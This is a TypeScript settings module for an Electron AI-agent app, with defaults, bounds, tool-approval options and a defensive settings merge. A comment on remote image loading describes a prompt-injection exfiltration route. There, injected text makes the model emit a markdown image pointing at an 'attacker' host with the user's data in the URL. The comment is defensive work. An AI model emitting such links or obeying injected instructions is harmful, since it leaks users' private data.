export const DEFAULT_ORCHESTRATOR_MODEL = "gpt-4.1-mini";
export const DEFAULT_VOICE_TRANSCRIPTION_MODEL = "whisper-1";
export const DEFAULT_VOICE_TTS_MODEL = "gpt-4o-mini-tts";
export const DEFAULT_VOICE_TTS_VOICE = "alloy";
export const VOICE_TTS_VOICE_OPTIONS = ["alloy", "echo", "fable", "onyx", "nova", "shimmer"] as const;
export const DEFAULT_AGENT_RUN_TIMEOUT_SECONDS = 60;
export const DEFAULT_CHAT_HISTORY_MESSAGE_LIMIT = 20;
export const DEFAULT_BG_MUSIC_VOLUME = 0.1;
export const DEFAULT_SYSTEM_STATS_POLL_INTERVAL_MS = 3000;
/** Number of pre-rendered variations available per SFX event (public/audio/sfx/<event>/v1..v5.wav). */
export const SOUND_FX_VARIANT_COUNT = 5;

/** The range a numeric setting is allowed to hold. */
export interface NumericBound {
  min: number;
  max: number;
  integer?: boolean;
}

/**
 * Must match the number kinds in `electron/main/settingsSchema.ts`, which is what actually
 * enforces them at the write boundary. The renderer declares its own copy because `electron/` and
 * `src/` are separate TypeScript projects — the same reason DEFAULT_SETTINGS is duplicated — and
 * `settingsDefaults.test.ts` asserts the two agree, so a bound changed on one side alone fails.
 *
 * Here they make the UI honest: the input advertises the real range, and a value outside it is
 * refused with a reason instead of snapping back silently.
 */
export const SETTING_BOUNDS = {
  agentRunTimeoutSeconds: { min: 5, max: 3600, integer: true },
  chatHistoryMessageLimit: { min: 1, max: 200, integer: true },
  bgMusicVolume: { min: 0, max: 1 },
  systemStatsPollIntervalMs: { min: 500, max: 600_000, integer: true },
} as const satisfies Record<string, NumericBound>;

export const TOOL_APPROVAL_DISPLAY_OPTIONS = ["modal", "inline"] as const;
export type ToolApprovalDisplay = (typeof TOOL_APPROVAL_DISPLAY_OPTIONS)[number];

export interface AgentsSettings {
  chatApiKey: string;
  chatApiUrl: string;
  voiceApiKey: string;
  voiceApiUrl: string;
  /** Which entry in AI_PROVIDERS this slot is pointed at. `""` means the slot predates the
   * provider registry and still reads the legacy chatApiKey/chatApiUrl pair — that is what keeps
   * an existing install behaving exactly as it did. */
  chatProviderId: string;
  voiceProviderId: string;
  voiceInputEnabled: boolean;
  typeAnywhereEnabled: boolean;
  onboardingDone: boolean;
  tourCompleted: boolean;
  agentName: string;
  agentDescription: string;
  /** User override for the orchestrator's system prompt; empty string means "use the built-in orchestrator.md". */
  orchestratorPromptOverride: string;
  userName: string;
  orchestratorModel: string;
  orchestratorEnabled: boolean;
  orchestratorMcpServerIds: string[];
  orchestratorConnectorIds: string[];
  orchestratorHttpToolCollectionIds: string[];
  /** Which HTTP methods pause the run and ask before they execute. Global on purpose —
   * approval is a posture ("I want to be asked before anything is deleted"), not a
   * property of one endpoint. Reads (GET/HEAD) never ask. */
  httpToolApprovalPost: boolean;
  httpToolApprovalPutPatch: boolean;
  httpToolApprovalDelete: boolean;
  /** How an approval request is presented: a blocking modal, or a card inline in the
   * chat log. */
  toolApprovalDisplay: ToolApprovalDisplay;
  voiceTranscriptionModel: string;
  voiceOutputEnabled: boolean;
  soundFxEnabled: boolean;
  voiceTtsModel: string;
  locationEnabled: boolean;
  /** Whether a remote image in a reply loads on sight, or waits for a click.
   *
   * Off by default, and the default is the security control. Replies are built from text
   * the app does not author — web search results, knowledge base files, MCP and HTTP tool
   * output, Gmail/Drive/Calendar. Any of those can carry an instruction that makes the model
   * emit `![](https://attacker/?d=<your data>)`, and an image that loads on sight sends that
   * request before anyone has read the reply. Requiring a click means data cannot leave
   * without a person agreeing, and the URL is on screen to be judged first.
   *
   * Local `data:` images are unaffected either way — they carry their own bytes and reach
   * no network. */
  remoteImagesAutoLoad: boolean;
  bgMusicEnabled: boolean;
  voiceTtsVoice: string;
  agentRunTimeoutSeconds: number;
  chatHistoryMessageLimit: number;
  bgMusicVolume: number;
  systemStatsPollIntervalMs: number;
  soundVariantSend: number;
  soundVariantReceive: number;
  soundVariantHandoff: number;
  soundVariantComplete: number;
  soundVariantStartup: number;
  soundVariantAgentCreated: number;
  soundVariantAgentDeleted: number;
  soundVariantConsult: number;
}

export const DEFAULT_SETTINGS: AgentsSettings = {
  chatApiKey: "",
  chatApiUrl: "",
  voiceApiKey: "",
  voiceApiUrl: "",
  chatProviderId: "",
  voiceProviderId: "",
  voiceInputEnabled: true,
  typeAnywhereEnabled: true,
  onboardingDone: false,
  tourCompleted: false,
  agentName: "Orbit",
  agentDescription: "Your personal AI orchestrator.",
  orchestratorPromptOverride: "",
  userName: "",
  orchestratorModel: DEFAULT_ORCHESTRATOR_MODEL,
  orchestratorEnabled: true,
  orchestratorMcpServerIds: [],
  orchestratorConnectorIds: [],
  orchestratorHttpToolCollectionIds: [],
  // All three default on: a fresh install asks before anything is written, and the user
  // relaxes what they don't want. The safe direction to be wrong in.
  httpToolApprovalPost: true,
  httpToolApprovalPutPatch: true,
  httpToolApprovalDelete: true,
  // Modal by default — it is the behaviour that already shipped, and a blocked run whose
  // prompt goes unnoticed reads as a hung app. One setting flips it to the inline card.
  toolApprovalDisplay: "modal",
  voiceTranscriptionModel: DEFAULT_VOICE_TRANSCRIPTION_MODEL,
  voiceOutputEnabled: true,
  soundFxEnabled: true,
  voiceTtsModel: DEFAULT_VOICE_TTS_MODEL,
  locationEnabled: false,
  remoteImagesAutoLoad: false,
  bgMusicEnabled: false,
  voiceTtsVoice: DEFAULT_VOICE_TTS_VOICE,
  agentRunTimeoutSeconds: DEFAULT_AGENT_RUN_TIMEOUT_SECONDS,
  chatHistoryMessageLimit: DEFAULT_CHAT_HISTORY_MESSAGE_LIMIT,
  bgMusicVolume: DEFAULT_BG_MUSIC_VOLUME,
  systemStatsPollIntervalMs: DEFAULT_SYSTEM_STATS_POLL_INTERVAL_MS,
  soundVariantSend: 1,
  soundVariantReceive: 1,
  soundVariantHandoff: 1,
  soundVariantComplete: 1,
  soundVariantStartup: 1,
  soundVariantAgentCreated: 1,
  soundVariantAgentDeleted: 1,
  soundVariantConsult: 1,
};

/**
 * What the renderer actually holds: every setting, plus the two booleans that stand in for the
 * API keys.
 *
 * `settings:get` does not return the keys — see getVisibleSettings in electron/main/ipc/settings.ts
 * — so `chatApiKey`/`voiceApiKey` are always "" here. They stay on the type because a *patch*
 * still carries them: writes go renderer → main normally, it is only the return trip that stops.
 */
export type SettingsView = AgentsSettings & {
  chatApiKeySet: boolean;
  voiceApiKeySet: boolean;
};

/** Kept out of DEFAULT_SETTINGS on purpose: that object mirrors the persisted settings exactly,
 * and `settingsDefaults.test.ts` asserts it matches main's SETTING_DEFAULTS key for key. These
 * two are derived signals, not settings. */
const DEFAULT_KEY_FLAGS = { chatApiKeySet: false, voiceApiKeySet: false };

/** The sound-effect settings, whose stored value has to sit inside the range the picker offers. */
const SOUND_VARIANT_KEYS = Object.keys(DEFAULT_SETTINGS).filter((key) =>
  key.startsWith("soundVariant")
) as (keyof AgentsSettings)[];

/**
 * Decides whether a stored value is usable, given the default that describes its shape.
 *
 * The default is the type reference — there is no separate schema on this side, and adding one
 * would be a second copy of what `DEFAULT_SETTINGS` already says.
 */
function isUsable(value: unknown, fallback: unknown): boolean {
  if (Array.isArray(fallback)) {
    return Array.isArray(value) && value.every((entry) => typeof entry === "string");
  }
  // Catches the case this function exists for: `null` is an object, so a stored null fails the
  // typeof check against every default except an array's, and falls back instead of winning.
  return value !== null && typeof value === typeof fallback;
}

/**
 * Merges a raw settings blob (from `agentsAPI.settings.get()`, shape not guaranteed) onto defaults.
 *
 * Per key rather than a spread. A spread lets anything in the blob win, including the things a
 * default exists to prevent: a stored `null` beat the default outright and reached the UI as
 * `<input value={null}>`, which flips React to an uncontrolled input; a `null` id list reached
 * components that iterate it. Writes have been validated since the settings schema landed, but
 * rows written by earlier builds are still out there, and this is the read side.
 *
 * Three rules:
 *  - a value whose type doesn't match its default is discarded
 *  - a sound variant outside the range the picker offers is clamped, because an out-of-range one
 *    makes the preview request a file that doesn't exist and leaves the Combobox showing a value
 *    absent from its own option list
 *  - a key nobody has heard of is dropped rather than carried through
 */
export function mergeWithDefaults(raw: Record<string, unknown>): SettingsView {
  const merged: SettingsView = { ...DEFAULT_SETTINGS, ...DEFAULT_KEY_FLAGS };
  // One local escape hatch so the loops below can address keys dynamically; `merged` keeps its
  // real type, so the return value is checked rather than asserted.
  const writable = merged as unknown as Record<string, unknown>;

  for (const [key, value] of Object.entries(raw)) {
    // Unknown keys are dropped. They cannot be written any more, but a database from before that
    // can still hold them, and carrying them into app state only spreads the mess further.
    if (!(key in writable)) continue;
    if (!isUsable(value, writable[key])) continue;
    writable[key] = value;
  }

  for (const key of SOUND_VARIANT_KEYS) {
    const variant = writable[key] as number;
    writable[key] = Math.min(SOUND_FX_VARIANT_COUNT, Math.max(1, Math.round(variant)));
  }

  return merged;
}
